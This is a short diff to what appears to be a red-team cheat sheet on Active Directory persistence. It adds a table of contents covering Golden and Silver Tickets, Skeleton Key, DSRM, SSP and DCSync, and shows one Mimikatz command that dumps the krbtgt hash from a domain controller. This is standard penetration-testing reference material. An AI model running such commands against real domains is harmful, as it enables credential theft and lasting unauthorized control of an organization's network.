@@ -1,6 +1,21 @@
-## Persistence on Active Directory 
+## AD Persistence
 
-### **Get `krbtgt` Hash**
+- Get krbtgt Hash](#get-krbtgt-hash)
+- [Golden Ticket](#golden-ticket)
+- [Silver Ticket](#silver-ticket)
+- [Skeleton Key](#skeleton-key)
+- [DSRM (Directory Services Restore Mode)](#dsrm--directory-services-restore-mode-)
+- [SSP (Security Support Provider)](#ssp--security-support-provider-)
+- [ACL Persistence](#acl-persistence)
+    + [SDPROP and AdminSDHolder](#sdprop-and-adminsdholder)
+    + [Domain Root Object ACL](#domain-root-object-acl)
+    + [DCSync](#dcsync)
+    + [WMI Security Descriptors](#wmi-security-descriptors)
+    + [Remote Registry](#remote-registry)
+- [MORE](#more)
+
+
+### Get krbtgt Hash
 ```powershell
 # On DC as a DA
 C:> Invoke-Mimikatz -Command '"lsadump:lsa /patch"'
